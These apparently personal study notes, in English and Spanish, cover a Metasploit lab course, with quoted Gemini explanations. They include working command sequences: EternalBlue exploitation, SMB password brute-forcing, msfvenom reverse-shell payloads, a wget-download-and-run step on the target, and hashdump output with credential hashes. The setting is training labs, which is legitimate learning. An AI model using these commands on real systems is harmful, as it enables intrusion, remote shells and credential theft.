# Metasploit Part 1

## Introduction.

> The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.
> 
> >  The exploitation process comprises three main steps; 
> > 
> > 1. finding the exploit, 
> > 
> > 2. customizing the exploit, 
> > 
> > 3. exploiting the vulnerable service.

The main components of the Metasploit Framework can be summarized as follows;

* **msfconsole**: The main command-line interface.
* **Modules**: supporting modules such as exploits, scanners, payloads, etc.
* **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset.
  
  

Metasploit Framework can be launch by using the command `msfconsole`. this console allow us to interact with different modules

> Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.



* **Vulnerability:** A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
  
  > Es el hecho de que alguien dejó la puerta de la bóveda sin seguro.

* **Exploit:** A piece of code that uses a vulnerability present on the target system.
  
  > Es la acción de empujar esa puerta específica y colarse al cuarto de la bóveda sin hacer sonar la alarma.

* **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.
  
  > Es lo que el ladrón hace _una vez adentro_. ¿Va a robar dinero? ¿Va a instalar una cámara oculta? ¿Va a dejar la puerta abierta para otros? El payload es el código que ejecuta la acción final.

---

## Componets (modules)

> **The next directories can see in the path `/opt/metasploit-framework/embedded/framework/modules`**

### Auxiliary

> Any supporting module

`tree -L 1 auxiliary/auxiliary/`

> > Gemini said
> > -----------
> > 
> > ¡Exactamente! Has dado en el clavo. En la vida real corporativa, los perímetros externos (firewalls, routers) suelen estar muy bien protegidos y actualizados. Por eso, el vector de ataque número uno a nivel mundial es el _Phishing_: usar ingeniería social para que un empleado, desde adentro de la red, le dé doble clic a un payload generado con `msfvenom`. Tu deducción es de analista avanzado.
> > 
> > Ahora, sobre tu segunda pregunta. Tienes toda la razón en que el Exploit (el vehículo) y el Payload (la carga explosiva o el shell) son las estrellas del show. Sin embargo, en un entorno real, las defensas no te van a dejar meter ese vehículo así de fácil. Ahí es donde entra el resto del equipo táctico de Metasploit.
> > 
> > Veámoslo como si estuvieras planeando el robo perfecto a un banco:
> > 
> > ### 1. Auxiliary (Reconocimiento y Preparación)
> > 
> > Antes de lanzar un misil (exploit), necesitas saber a qué le estás disparando. Los módulos auxiliares **no usan payloads**. Su trabajo es escanear, enumerar, hacer fuerza bruta o robar banners de información.
> > 
> > * **La Analogía:** Son los binoculares para vigilar el banco desde la calle, los micrófonos direccionales y la prueba de tocar la puerta a ver si está sin llave.
> > 
> > * **Técnico:** Son escáneres (como el `ssh_login` o `smb_enumshares` que usaste) o herramientas de denegación de servicio (DoS) que interactúan con el protocolo pero no buscan inyectar código malicioso en la memoria.

### Encoders

> Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
> 
>  Encoders can have a limited success rate as antivirus solutions can perform additional checks.

`tree -L 1 encoders/encoders/`



### Evation

> While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.

`tree -L 2 evasion/evasion/`



### Exploits

> Exploits, neatly organized by target system.

`tree -L exploits/exploits/`





### NOPs



> NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
> 
> > Este es el concepto más técnico y está estrictamente ligado al desarrollo de exploits de _Buffer Overflow_ (Desbordamiento de Memoria).
> > 
> > * **La Analogía:** Imagina que tienes que saltar en paracaídas (la ejecución del programa) y caer exactamente en un blanco de 1 metro cuadrado en el suelo (tu payload). Es muy difícil acertar. Un NOP es como construir un embudo gigante o una rampa de hielo de 100 metros alrededor del blanco. Si caes en cualquier parte de la rampa, te vas a resbalar inevitablemente hasta el centro.
> > 
> > * **Técnico:** En código ensamblador (Assembly), un NOP (`\x90`) le dice al procesador "no hagas nada, pasa a la siguiente instrucción". Los creadores de exploits inyectan cientos de NOPs juntos (un _NOP Sled_ o trineo de NOPs) justo antes de inyectar el payload. Así, si la memoria se mueve un poco y el procesador no aterriza exactamente en el inicio de tu payload, aterrizará en los NOPs, se deslizará sin hacer nada y terminará ejecutando el payload de todas formas.

`tree -L 1 nops/nops





### Payloads

> Payloads are codes that will run on the target system.

`tree -L 1 payloads/payloads/`

You will see four different directories under payloads: adapters, singles, stagers and stages.

* **Adapters:** An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.  

* **Singles:** Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run. (self-contained payloads)

* > as indicated by the “_” between “shell” and “reverse”.  eg. generic/shell_reverse_tcp

* **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.

* **Stages:** Downloaded by the stager. This will allow you to use larger sized payloads.
  
  > as indicated by the “/” between “shell” and “reverse”. eg. windows/x64/shell/reverse_tcp
  
  

### Post

> Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.
> 
> > El exploit y el payload ya hicieron su trabajo: ya estás adentro con una sesión de Meterpreter. ¿Ahora qué? Los módulos `post` automatizan el saqueo.
> > 
> > * **La Analogía:** Ya volaste la puerta de la bóveda y estás adentro. El módulo de post-explotación es la bolsa para guardar los lingotes de oro, el soplete para abrir las cajas de seguridad individuales y el borrador para borrar las cintas de las cámaras de seguridad antes de irte.
> > 
> > * **Técnico:** Automatizan tareas de recolección de credenciales, escalada de privilegios local, movimientos laterales (saltar a otra computadora dentro de la misma red) y borrar logs del sistema para no dejar rastro.

`tree -L 1 post/post/`



---

## msfconsole

> this is the main interface when using Metasploit Framework. we can start thi by using `msfconsole`



Under this console with can use some linux commands but not at all. eg. redirections is not supported.



To display the help manu we can use `help` or `?`



for a specific command: `help set`



Now with `use` we can select the context we want to work. the example bellow we are using the exploit: eternalblue which is related to windows and SMB protocol.

> Msfconsole is managed by context; this means that unless set as a global variable, all parameter settings will be lost if you change the module you have decided to use. Example: if we use the ms17_010_eternalblue exploit, and we have set parameters [variables] such as `RHOSTS`. If we were to switch to another module (e.g. a port scanner), we would need to set the RHOSTS value again as all changes we have made remained in the context of the ms17_010_eternalblue exploit.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```



After the console have a context on where we will work on we can then see the options we have by the command `show options`. This will print options related to the exploit we selected.

The `show` command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules



To get more info about the module or context we are using we can use `info`. this is not a help menu but provide us information about the author, relevant sources, etc.

To leave the context we can use `back`



With `search` we onduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.





Ranks: [Exploit Ranking · rapid7/metasploit-framework Wiki · GitHub](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)



We can direct the `search` function using keywords such as type and platform.



For example, if we wanted our search results to only include auxiliary modules, we could set the type to auxiliary. The screenshot below shows the output of the `search type:auxiliary telnet` command.



---

## Working with the console

> Remember, based on the module you use, additional or different parameters may need to be set. It is good practice to use the `show options` command to list the required parameters [variables]. `show advanced` shows you all the paramerters



### Common Variables (Parameters) to Set

While each module requires specific parameters, the following are the most universally used variables across the Metasploit Framework. You configure them using the `set` command.

| Variable              | Description                                                                                                                     | Example / Typical Value                           |
|:--------------------- |:------------------------------------------------------------------------------------------------------------------------------- |:------------------------------------------------- |
| `RHOSTS`              | **R**emote **Host(s)**. The IP address, domain name, or range of the target(s) you are attacking or scanning.                   | `set RHOSTS 10.10.10.5` or `192.168.1.0/24`       |
| `RPORT`               | **R**emote **Port**. The specific port number on the target system that the service is running on.                              | `set RPORT 445` (for SMB) or `80` (for HTTP)      |
| `LHOST`               | **L**ocal **Host**. Your attacker machine's IP address. Used by reverse payloads to know where to connect back to.              | `set LHOST 10.9.8.7` or `set LHOST tun0`          |
| `LPORT`               | **L**ocal **Port**. The port on your attacker machine that will be listening for the incoming reverse connection.               | `set LPORT 4444`                                  |
| `PAYLOAD`             | The specific payload module to deliver to the target after a successful exploit.                                                | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` |
| `THREADS`             | The number of concurrent threads to use. Higher numbers make scans/brute-forcing faster but much noisier.                       | `set THREADS 10`                                  |
| `SESSION`             | The session ID number. Used primarily in post-exploitation modules to specify which active background session to interact with. | `set SESSION 1`                                   |
| `SMBUser` / `SMBPass` | Credentials (username and password/hash) used to authenticate to an SMB service if required.                                    | `set SMBUser admin`                               |

For the laboratory reaching a host target 10.67.189.1. we use:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue/


set rhost 10.67.189.1
show options #to see if we connected with the target host

```



> Note: we can reach a range of target, for example we can create a file with a list of some IPs then to reach them in metasploit console we use `set rhost file:[PathOfTheFile]`
> 
> or just user rage notation:  (/24, /16, etc.) or  (10.10.10.x – 10.10.10.y)



Using `unset all` we can clear all set parameters. or use just `uset [module, eg. playload]` to clear a specific value



if we can use a model and `set` a value (eg rhost), then `back` to go to another module 

switch to another module we need to `set` the value again. However if we use `setg` this doesn't happend. the value is set for any module you switch.



---

To launch the module we use `exploit` or `run` witch is the alias. 



The `exploit` command can be used without any parameters or using the “`-z`” parameter.

The `exploit -z` command will run the exploit and background the session as soon as it opens.



Some modules support the `check` option. This will check if the target system is vulnerable without exploiting it.



---

**Sessions**  

Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit.



We can see the sessions created for the exploit with `sessions`   

To interact (or enter) with any of the sessions we use `sessions -i [number the seccion]`



You can use the `background` command to background the session prompt and go back to the msfconsole prompt.



Being in a session using meterpreter we can now interact with the target machine. For example we can just prompt `shell` in the terminal to enter to the target's shell. [same with any win command]





---

### Advanced Search Keywords (Filters)

We can direct the `search` function using specific keywords to narrow down the results effectively and avoid cluttered outputs. 

| Keyword    | Description                                                                    | Example                                     |
|:---------- |:------------------------------------------------------------------------------ |:------------------------------------------- |
| `type`     | Filters by module type (exploit, payload, auxiliary, encoder, evasion, post).  | `search type:exploit smb`                   |
| `platform` | Filters by target operating system (windows, linux, android, apple, etc.).     | `search platform:windows smb`               |
| `cve`      | Searches for a specific Common Vulnerabilities and Exposures (CVE) year or ID. | `search cve:2017` or `search cve:2017-0144` |
| `name`     | Searches for a specific string within the module's name.                       | `search name:eternalblue`                   |
| `author`   | Filters modules written by a specific author or researcher.                    | `search author:rapid7`                      |
| `app`      | Filters by the specific application being targeted (client or server).         | `search app:client`                         |

**Pro-Tip for Chaining Filters:**
You can combine multiple keywords to be extremely precise in your search.
`search cve:2017 type:exploit platform:windows smb`



> El comando se escribe poniendo `grep` al principio, así: `grep [palabra_a_filtrar] search [tu_busqueda]`

> Ejemplo súper útil para tu caso: `grep linux search type:exploit samba`

---

# Metasploit Part 2

wordlist for the lab: `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`

## Port scanning

There are number of modules to scan open port on the target system and network In Metaspliot. To list potential port scanning modules we use `search portscan` or `search scanner` or `search portscanner. 



As soon as you choose the module with `use` you should use `show options` to see the options, some of the are:

* **CONCURRENCY:** Number of targets to be scanned simultaneously.
* **PORTS:** Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
* **RHOSTS:** Target or target network to be scanned.
* **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.
  
  

> We can perform Nmap from msfconsole as well, eg.  `nmap -sS 10.10.12.229`. this is the best option to consider if we are looking for a speedier approach.



### UDP service indentification

The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP

### SMB Scans

useful in a corporate network would be `smb_enumshares` and `smb_version`

### NetBIOS

`auxiliary/scanner/netbios/nbname` similar to SMB, allows computers to communicate over the network to share file or send files to printers.



### Practica:

1. me piden cuantos puertos estan abiertos en el target, los resolvi con:

```bash
nmap -sS iptarget
```

2. me preguntan que nombre veo en netBios usando un scanner. lo resolvi usando el moodulo netbios/nbname

3. me preguntan que esta corriendo en el puerto 8000
   
   > lo resolvi llendo al modulo http_version

4. Me piden sabe el SMB PW de "penny" usando el wordlist mencionado en el task.
   
   > lo resolvi estando en smb_login module
   > set rhost
   > set smbuser penny
   > set pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt

---

## Metasploit Database

> Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.
> 
> The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace.

### Install the database

1. systemctl start postgresql

2. sudo -u postgres msfdb init
   
   > to delete: sudo -u postgres msfdb delete

3. launch msfconsole and then check the DB status with `db_status`

4. To list the available workspaces: `workspace`
   
   1. to add a workspace: `workspace -a`
   
   2. Delete a workspace: `worskspace d`
      
      

Using the `workspace` command follow by the name of a workspace allow you to go to that workspace..



The option -h show you the options menu.



### Database commands

When Metasploit is lauched with a database the comman help or ? show the database backends commands menu.



So for example, when running the db_nmap, all results will be saved to the database



To reach relevan information about eh hosts and services we can run `hosts` and `services` commands, respectively. With the option -h we can see all the availble options for those these commands.



Using the `hosts -R` we are adding the value to `rhost`

> **Example Workflow**
> 
> 1. We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the `use auxiliary/scanner/smb/smb_ms17_010` command.
> 2. We set the RHOSTS value using `hosts -R`.
> 3. We have typed `show options` to check if all values were assigned correctly. (In this example, 10.10.138.32 is the IP address we have scanned earlier using the `db_nmap` command)
> 4. Once all parameters are set, we launch the exploit using the `run` or `exploit` command.



If there is more than one host saved to the database, all IP addresses will be used when the `hosts -R` command is used.   This substitute the RHOST

In a typical penetration testing engagement, we could have the following scenario: 

* Finding available hosts using the `db_nmap` command 

> Example nmap and show versions: db_nmap -sV -p- 10.10.12.229

* Scanning these for further vulnerabilities or open ports (using a port scanning module)
  
  

The services command used with the `-S` parameter will allow you to search for specific services in the environment.

Example: 

```bash
msf6 > services -S netbios                                                                                       
Services                                                                                                             
========                                                                                                             

host          port  proto  name         state  info                                                                              
----          ----  -----  ----         -----  ----                                                                              
10.10.12.229  139   tcp    netbios-ssn  open   Microsoft Windows netbios-ssn
```



> You may want to look for low-hanging fruits such as:
> 
> * HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
> * FTP: Could allow anonymous login and provide access to interesting files.
> * SMB: Could be vulnerable to SMB exploits like MS17-010
> * SSH: Could have default or easy to guess credentials
> * RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.



---

### Exploitation



Expliots are the most populated modules, we can `search` them, optain more `info`  and launch the exploit using `exploit`

> a successful outcome depends on a thorough understanding of services running on the target system.



Most of the exploits will have a preset default payload. However, we can always use the `show payloads` command to list other commands you can use with that specific exploit.

* Once you have decided on the payload, you can use the `set payload` command to make your choice.

>  choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available



Some payloads will open new parameters that we may need to set, running the `show options` command once more can show these. for example a reverse payload will at least require you to set the `LHOST` option.





Once a session is opened, you can background it using `CTRL+Z` or abort it using `CTRL+C`



#### Working with sessions

The `sessions` command will list all active sessions. The `sessions -h` command show the options we can use for the session.



`sessions -i` to interact with any open session.





### Practica

**DATA**

file to bruteforce: /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt

Target: 10.64.137.40

SMB version 6.1.0

Hosts: __msbrowse__

port 8000 runs: webfs/1.21

> module http_version

With NetBIOS scanner we get: ACME IT SUPPORT 

> [module netbios/nbname]

SMB User's name and PW: penny / leo1234 {son maquinas distintas esta esta en 10.64.137.40}

> lo resolvi estando en smb_login moduleset rhostset smbuser pennyset pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt



Al ingresar al SMB de penny obtengo:

> ```bash
> SMB (10.64.137.40) > shares
> Shares
> ======
> 
>     #  Name    Type         comment
>     -  ----    ----         -------
>     0  print$  DISK         Printer Drivers
>     1  IPC$    IPC|SPECIAL  IPC Service (ip-10-64-137-40 server (Samba, 1776))
> 
> 
> ```





---



Target exploit: 10.64.144.169

> no confundir con la maquina de penny en el task scanning

Open ports

> db_nmap -sV -p- ip

| Protocol    | port     | version                                                       |
| ----------- | -------- | ------------------------------------------------------------- |
| ftp         | 21 tcp   | ProFETD                                                       |
| ssh         | 22 tcp   | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) |
| netbios-ssn | 139      | samba smbd 4.6.2                                              |
| netbios-ssn | 445      | samba smbd 4.6.2                                              |
| http        | 8000 tcp | WebFS httpd 1.21                                              |
| OS          | Linux    | cpe:/o:linux:linux_kernel                                     |

* usando el bruteforce en SSH para pirate user no funciono

* hay una pista en la plataforma que indica: Exploit one of the critical vulnerabilities on the target VM. yo sospecho que es samba

* por lo que en este momento estoy usando el modulo exploit/linux/samba/is_known_pipename con el único playload que me recomienda metasploit cmd/unix/interact 

---

* sospechoso 1: ProETD ftp port 21 tcp
  
  * **Módulo a buscar:** `exploit/unix/ftp/proftpd_modcopy_exec`
  
  * **Por qué:** Si el puerto 8000 está corriendo un servidor web, podrías intentar mover archivos del sistema a la raíz del servidor web para leerlos.

* Sospechoso 2: samba netbios 139 455 version 462
  
  * **Módulo:** `auxiliary/scanner/smb/smb_enumshares` with penny credentials to check if there is something tha can be share

* Sospechoso 3: WebFS 1.21 http 8000
  
  * Este servidor web en el puerto 8000 es minimalista. Si logras subir un archivo mediante ProFTPD o SMB, podrías ejecutar un **Reverse Shell**.
    
    
    
    

**first try**

```bash
exploit/unix/ftp/proftpd_modcopy_exec

RHOSTS 10.64.183.205

RPORT 8000

RPORT_FTP 21

SITEPATH /var/www/html

LHOST 10.64.110.98

LPORT 4444

set payload cmd/unix/reverse_netcat

msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run[*] Started reverse TCP handler on 10.64.110.98:4444 [-] 10.64.183.205:8000 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.64.183.205:21).[*] Exploit completed, but no session was created.
```



**Second Try**

```bash
exploit/unix/ftp/proftpd_133c_backdoor
RHOSTS 10.64.183.205
RPORT 21


msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
[-] 10.64.183.205:21 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.

```

---



**Third try**

**habia que esta en la maquina correcta**

> Todo lo anterior esta incorrecto puesto que el nmap que se corrorio al inicio no correcpondia a la maquina correcta de este task. lo siguente es la solucion correcta de este task "exploit" >>>

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > options
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.64.144.169
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
meterpreter


meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows

--------------------------------------------
#Questions 2 flag.txt file
meterpreter > search -f flag.txt
meterpreter > cat "c:\Users\Jon\Documents\flag.txt"

-----------------------------------------------

#question 3 NTLM hash of the password of the user "pirate"

meterpreter > hashdump        # hasdump es una herramienta de metasploit en una sesion de meterpreter pasa extraer las bases de datos de passwords de un sistema comprometido.

pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::        # :8ce9a3ebd1647fcc5e04025019f4b875 el cual es la cuarta seccion que corresponde a NTLM de pirate



-----------------------------------------------


# si corremos un nmap en la maquina correcta, este nos da el resultado correcto.

msf6 exploit(windows/smb/ms17_010_eternalblue) > nmap -sV 10.64.144.169

Nmap scan report for 10.64.144.169
Host is up (0.00041s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows


```



---

## Msfvenom

> replaced Msfpayload and Msfencode, allows you to generate payloads.
> 
> Msfvenom allow us to access all payloads in the metasploit framework but also allow us to create payloads in may differente formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).



* Command to list msfvenom payloads: `msdvenom -l payloads`

* List output formats: `msfvenom --list formats`
  
  

### Encoders

> This tools "encode" the payload. [this don't aim to bypass antivirus] but this can be effective against some antivirus. However using modern obfuscatio techniques or learning methods to inject shellcode is a better solution to the problem.



The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.

```bash
root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```



### Handlers

> **'catching a shell'** is a term used when we receive connection from a target. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.





Example: exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application)

Steps:

1. Generate the PHP shell using MSFvenom
2. Start the Metasploit handler
3. Execute the PHP shell
   
   

1.

> MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.
> 
> ```bash
> root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
> ```



The output PHP file will miss the starting PHP tag commented and the end tag (`?>`), as seen below.

> Check it by `cat reverse_shell.php`
> 
> we will need to enter to that file and change: the tag `/*<?php  /**/` for <?php. And the end add `?>`





2.

> We will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command. Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.

To use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.



```bash
msf6 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
msf6 exploit(multi/handler) > run
```



### Other Payloads



> msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:
> 
> In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.



Linux Executable and Linkable Format (elf)  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  

Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  

PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  

ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  

Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`  

All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler





### Practica

```bash
# ======================================================================
# GENERATE CUSTOM PAYLOADS WITH MSFVENOM & CATCHING SHELLS (MULTI/HANDLER)
# ======================================================================

# ----------------------------------------------------------------------
# STEP 1: ATTACKER MACHINE (Terminal 1) - Generate & Host Payload
# ----------------------------------------------------------------------
# Generate a meterpreter payload in .elf format (Linux executable)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.65.118.137 LPORT=1234 -f elf > shell.elf

# Start a Python web server to host the payload file
python3 -m http.server 9000


# ----------------------------------------------------------------------
# STEP 2: ATTACKER MACHINE (Terminal 2) - Set up the Listener
# ----------------------------------------------------------------------
msfconsole
use exploit/multi/handler 
set lport 1234
set lhost 10.65.118.137
set payload linux/x86/meterpreter/reverse_tcp
run
# Note: The console will stay "listening" for the target to execute the payload.


# ----------------------------------------------------------------------
# STEP 3: TARGET MACHINE - Transfer & Execute
# ----------------------------------------------------------------------
# Download the payload from the attacker's web server
wget http://10.65.118.137:9000/shell.elf

# Grant execution permissions to the file
chmod +x shell.elf 

# Execute the payload (Pull the trigger!)
./shell.elf 


# ----------------------------------------------------------------------
# STEP 4: ATTACKER MACHINE (Terminal 2) - Post-Exploitation & Hashdump
# ----------------------------------------------------------------------
# Once the payload is executed on the target, meterpreter opens.
meterpreter > background

# Extract hashes from the compromised Linux system
msf6 exploit(multi/handler) > use post/linux/gather/hashdump 
msf6 post(linux/gather/hashdump) > options
msf6 post(linux/gather/hashdump) > set session 2
msf6 post(linux/gather/hashdump) > run

# Target Output (Extracted Flag/Hash):
# [+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
```







---

# Metaspliot Part 3

## Meterprerer

> Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.  
> 
> While Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.
> 
> Meterpreter runs in the RAM and not un the device memory to avoit be detected by some antivirus.



The command `getpid` it returns the PID the meterpreter is running. Then is we run `ps` command we will see another name user that PID, not meterpreter witch is expected. 



Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)

> ```bash
> C:\Windows\system32>tasklist /m /fi "pid eq 1304"
> tasklist /m /fi "pid eq 1304"
> 
> Image Name                     PID Modules                                     
> ========================= ======== ============================================
> spoolsv.exe                   1304 ntdll.dll, kernel32.dll, KERNELBASE.dll,
> ```



It is also worth noting that Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system.



---

## Metapreter Flavors.

The easiest way to have an idea about available Meterpreter versions could be to list them using msfvenom. We have used the `msfvenom --list payloads` command and grepped "meterpreter" payloads (adding `| grep meterpreter` to the command line).



The list will show Meterpreter versions available for the following platforms;

* Android
* Apple iOS
* Java
* Linux
* OSX
* PHP
* Python
* Windows

Your decision on which version of Meterpreter to use will be mostly based on three factors;

* The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
* Components available on the target system (Is Python installed? Is this a PHP website? etc.)
* Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
  
  

Typing `help` on any Meterpreter session (shown by `meterpreter>` at the prompt) will list all available commands. Every version of Meterpreter will have different command options.



**Example**: 
Meterpreter will provide you with three primary categories of tools;

* Built-in commands
* Meterpreter tools
* Meterpreter scripting

If you run the `help` command, you will see Meterpreter commands are listed under different categories.

* Core commands
* File system commands
* Networking commands
* System commands
* User interface commands
* Webcam commands
* Audio output commands
* Elevate commands
* Password database commands
* Timestomp commands
  
  

## Meterpreter commands

**Core** commands will be helpful to navigate and interact with the target system.

Others Commands (these will be listed under different menu categories in the help menu)



Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.



## Post-Explotation with Meterpreter.

> Meterpreter provides you with many useful commands that facilitate the post-exploitation phase.



**Help**



**getuid**: The `getuid` command will display the user with which Meterpreter is currently running. This will give you an idea of your possible privilege level on the target system



**PS**: command will list running processes. The PID column will also give you the PID information you will need to migrate Meterpreter to another process.



**Migrate**: Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.

> To migrate to any process, you need to type the migrate command followed by the PID of the desired target process.
> 
> Be careful; you may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You may not be able to gain them back.



**Hashdump**: will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.



**Search**: is useful to locate files with potentially juicy information: `search -f flag2.txt`, you may need to search for user-generated files or configuration files that may contain password or account information.



**Shell**: The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.



**getsystem**



**load**: leverage additional tools such as Kiwi or even the whole Python language: `load python`. As son as we load any additional tool the command `help` will show us options of that tool as well.



---



The The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.

